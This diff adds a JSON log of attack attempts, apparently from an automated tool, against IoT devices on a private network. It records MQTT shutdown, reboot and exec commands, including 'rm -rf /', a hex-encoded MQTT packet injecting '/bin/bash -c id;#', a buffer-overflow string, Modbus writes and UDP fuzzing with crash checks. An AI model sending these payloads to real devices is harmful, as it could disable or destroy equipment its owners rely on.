@@ -1,0 +1,502 @@
+[
+  {
+    "timestamp": 1773685778.2658708,
+    "target_ip": "192.168.100.20",
+    "target_arch": "Unknown",
+    "tool_used": "tcp_send",
+    "payload_hex": "474554202f3f636d643d6578706c6f6974",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 111] Connection refused",
+      "sent_hex": "474554202f3f636d643d6578706c6f6974"
+    }
+  },
+  {
+    "timestamp": 1773685779.352175,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "6d616c6963696f75735f7061796c6f6164",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.20:1883",
+      "topic": "test/topic",
+      "payload": "malicious_payload",
+      "published": true,
+      "timing_ms": 2
+    }
+  },
+  {
+    "timestamp": 1773685779.3646286,
+    "target_ip": "192.168.100.20",
+    "target_arch": "MIPS or ARM",
+    "tool_used": "modbus_request",
+    "payload_hex": "000100000064011000000001",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 111] Connection refused",
+      "sent_hex": "000100000064011000000001"
+    }
+  },
+  {
+    "timestamp": 1773685806.1707783,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [],
+      "messages_received": 0
+    }
+  },
+  {
+    "timestamp": 1773685807.1947181,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a2273687574646f776e227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.20:1883",
+      "topic": "iot/commands/shutdown",
+      "payload": "{\"action\":\"shutdown\"}",
+      "published": true,
+      "timing_ms": 6
+    }
+  },
+  {
+    "timestamp": 1773685812.4510012,
+    "target_ip": "192.168.100.16",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [
+        "iot/sensors/humidity",
+        "iot/sensors/pressure",
+        "iot/sensors/temperature"
+      ],
+      "messages_received": 3
+    }
+  },
+  {
+    "timestamp": 1773685852.4111493,
+    "target_ip": "192.168.100.20",
+    "target_arch": "Unknown",
+    "tool_used": "udp_send",
+    "payload_hex": "74657374",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "74657374",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 5005,
+      "details": "No UDP response \u2014 device may have dropped or crashed"
+    }
+  },
+  {
+    "timestamp": 1773685880.997237,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a227265626f6f74227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.20:1883",
+      "topic": "iot/commands/reboot",
+      "payload": "{\"action\":\"reboot\"}",
+      "published": true,
+      "timing_ms": 7
+    }
+  },
+  {
+    "timestamp": 1773685886.014825,
+    "target_ip": "192.168.100.20",
+    "target_arch": "Unknown",
+    "tool_used": "udp_send",
+    "payload_hex": "ddffff",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "ddffff",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 5002,
+      "details": "No UDP response \u2014 device may have dropped or crashed"
+    }
+  },
+  {
+    "timestamp": 1773685886.0337172,
+    "target_ip": "192.168.100.20",
+    "target_arch": "MIPS or ARM",
+    "tool_used": "modbus_request",
+    "payload_hex": "000100000800010300000001",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 111] Connection refused",
+      "sent_hex": "000100000800010300000001"
+    }
+  },
+  {
+    "timestamp": 1773685904.405817,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [],
+      "messages_received": 0
+    }
+  },
+  {
+    "timestamp": 1773685904.9554467,
+    "target_ip": "192.168.100.20",
+    "target_arch": "Unknown",
+    "tool_used": "tcp_send",
+    "payload_hex": "101e00044d5154540402003c000f696f742f636f6d6d616e64732f73687574646f776e",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 104] Connection reset by peer",
+      "sent_hex": "101e00044d5154540402003c000f696f742f636f6d6d616e64732f73687574646f776e"
+    }
+  },
+  {
+    "timestamp": 1773685927.6948237,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7061796c6f61645f64617461",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.20:1883",
+      "topic": "test/topic",
+      "payload": "payload_data",
+      "published": true,
+      "timing_ms": 7
+    }
+  },
+  {
+    "timestamp": 1773685933.0160756,
+    "target_ip": "192.168.100.20",
+    "target_arch": "Unknown",
+    "tool_used": "udp_send",
+    "payload_hex": "637573746f6d5f7061796c6f6164",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "637573746f6d5f7061796c6f6164",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 5022,
+      "details": "No UDP response \u2014 device may have dropped or crashed"
+    }
+  },
+  {
+    "timestamp": 1773685944.8301523,
+    "target_ip": "192.168.100.20",
+    "target_arch": "unknown",
+    "tool_used": "replay_probe",
+    "payload_hex": "7B 22 61 63 74 69 6F 6E 22 3A 22 73 68 75 74 64 6F 77 6E 22 7D",
+    "packets_sent": 1,
+    "outcome": "replay_delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 104] Connection reset by peer",
+      "sent_hex": "7b22616374696f6e223a2273687574646f776e227d"
+    }
+  },
+  {
+    "timestamp": 1773685977.5718517,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "6578706c6f69745f7061796c6f6164",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.20:1883",
+      "topic": "test/topic",
+      "payload": "exploit_payload",
+      "published": true,
+      "timing_ms": 8
+    }
+  },
+  {
+    "timestamp": 1773686017.2662375,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [],
+      "messages_received": 0
+    }
+  },
+  {
+    "timestamp": 1773686022.303592,
+    "target_ip": "192.168.100.20",
+    "target_arch": "Unknown",
+    "tool_used": "udp_send",
+    "payload_hex": "400100000000ffffffff41424344",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "400100000000ffffffff41424344",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 5026,
+      "details": "No UDP response \u2014 device may have dropped or crashed"
+    }
+  },
+  {
+    "timestamp": 1773686037.6994758,
+    "target_ip": "192.168.100.16",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a2273687574646f776e227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.16:1883",
+      "topic": "iot/commands/shutdown",
+      "payload": "{\"action\":\"shutdown\"}",
+      "published": true,
+      "timing_ms": 3
+    }
+  },
+  {
+    "timestamp": 1773686074.3903632,
+    "target_ip": "192.168.100.20",
+    "target_arch": "MIPS or ARM",
+    "tool_used": "modbus_request",
+    "payload_hex": "00010000080001050000ff00",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 111] Connection refused",
+      "sent_hex": "00010000080001050000ff00"
+    }
+  },
+  {
+    "timestamp": 1773686081.555166,
+    "target_ip": "192.168.100.20",
+    "target_arch": "Unknown",
+    "tool_used": "tcp_send",
+    "payload_hex": "103000044d51545404c2003c00102f62696e2f62617368202d632069643b23",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "103000044d51545404c2003c00102f62696e2f62617368202d632069643b23",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 5023,
+      "details": "No response within timeout"
+    }
+  },
+  {
+    "timestamp": 1773686130.2273734,
+    "target_ip": "192.168.100.20",
+    "target_arch": "Unknown",
+    "tool_used": "udp_send",
+    "payload_hex": "74657374207061796c6f6164",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "74657374207061796c6f6164",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 5006,
+      "details": "No UDP response \u2014 device may have dropped or crashed"
+    }
+  },
+  {
+    "timestamp": 1773686133.2488065,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [],
+      "messages_received": 0
+    }
+  },
+  {
+    "timestamp": 1773686134.2758594,
+    "target_ip": "192.168.100.20",
+    "target_arch": "MIPS or ARM",
+    "tool_used": "verify_crash",
+    "payload_hex": "",
+    "packets_sent": 2,
+    "outcome": "alive",
+    "details": {
+      "status": "alive",
+      "verified": false,
+      "ip": "192.168.100.20",
+      "details": "TCP handshake succeeded on port 22"
+    }
+  },
+  {
+    "timestamp": 1773686160.898384,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "6578706c6f69745f7061796c6f6164",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.20:1883",
+      "topic": "test/topic",
+      "payload": "exploit_payload",
+      "published": true,
+      "timing_ms": 1
+    }
+  },
+  {
+    "timestamp": 1773686202.366908,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22636d64223a22726d202d7266202f222c22746172676574223a2273797374656d227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.20:1883",
+      "topic": "iot/commands/exec",
+      "payload": "{\"cmd\":\"rm -rf /\",\"target\":\"system\"}",
+      "published": true,
+      "timing_ms": 8
+    }
+  },
+  {
+    "timestamp": 1773686207.380299,
+    "target_ip": "192.168.100.20",
+    "target_arch": "Unknown",
+    "tool_used": "udp_send",
+    "payload_hex": "0100000000000000ffffffff000000004142434445464748",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "0100000000000000ffffffff000000004142434445464748",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 5001,
+      "details": "No UDP response \u2014 device may have dropped or crashed"
+    }
+  },
+  {
+    "timestamp": 1773686223.7833512,
+    "target_ip": "192.168.100.20",
+    "target_arch": "MIPS or ARM",
+    "tool_used": "verify_crash",
+    "payload_hex": "",
+    "packets_sent": 2,
+    "outcome": "alive",
+    "details": {
+      "status": "alive",
+      "verified": false,
+      "ip": "192.168.100.20",
+      "details": "TCP handshake succeeded on port 22"
+    }
+  },
+  {
+    "timestamp": 1773686258.501261,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b2274797065223a226275666665725f6f766572666c6f77222c2264617461223a2241414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.20:1883",
+      "topic": "iot/debug/input",
+      "payload": "{\"type\":\"buffer_overflow\",\"data\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}",
+      "published": true,
+      "timing_ms": 8
+    }
+  },
+  {
+    "timestamp": 1773686278.116382,
+    "target_ip": "192.168.100.20",
+    "target_arch": "MIPS or ARM",
+    "tool_used": "verify_crash",
+    "payload_hex": "",
+    "packets_sent": 2,
+    "outcome": "alive",
+    "details": {
+      "status": "alive",
+      "verified": false,
+      "ip": "192.168.100.20",
+      "details": "TCP handshake succeeded on port 22"
+    }
+  },
+  {
+    "timestamp": 1773686298.0302494,
+    "target_ip": "192.168.100.20",
+    "target_arch": "Unknown",
+    "tool_used": "udp_send",
+    "payload_hex": "74657374",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "74657374",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 5009,
+      "details": "No UDP response \u2014 device may have dropped or crashed"
+    }
+  },
+  {
+    "timestamp": 1773686301.0530722,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [],
+      "messages_received": 0
+    }
+  }
+]
